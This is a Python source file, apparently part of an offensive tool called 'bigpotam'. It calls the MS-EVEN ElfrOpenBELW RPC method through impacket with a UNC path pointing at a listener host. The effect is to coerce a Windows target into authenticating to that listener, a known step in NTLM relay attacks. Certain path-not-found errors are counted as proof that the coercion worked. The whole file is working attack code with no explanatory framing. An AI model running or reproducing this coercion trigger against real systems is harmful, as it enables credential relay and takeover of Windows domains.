"""MS-EVEN trigger function."""

import logging
import random
import string

from impacket.dcerpc.v5 import even
from impacket.dcerpc.v5.dtypes import NULL

log = logging.getLogger("bigpotam")

SUCCESS_CODES = (
    "ERROR_BAD_NETPATH",
    "STATUS_OBJECT_PATH_NOT_FOUND",
    "STATUS_CONNECTION_DISCONNECTED",
)


def _check_success(e):
    err = str(e)
    return any(code in err for code in SUCCESS_CODES)


def _rnd(n=8):
    return "".join(random.choices(string.ascii_lowercase, k=n))


def trigger_elfr_open_belw(dce, listener, listener_port=None, **kw):
    """ElfrOpenBELW (opnum 9) — uses device path format."""
    try:
        request = even.ElfrOpenBELW()
        request["UNCServerName"] = NULL
        request["BackupFileName"] = "\\??\\UNC\\%s\\%s\\aa\x00" % (listener, _rnd())
        request["MajorVersion"] = 1
        request["MinorVersion"] = 1
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("ElfrOpenBELW: %s", e)
        return False
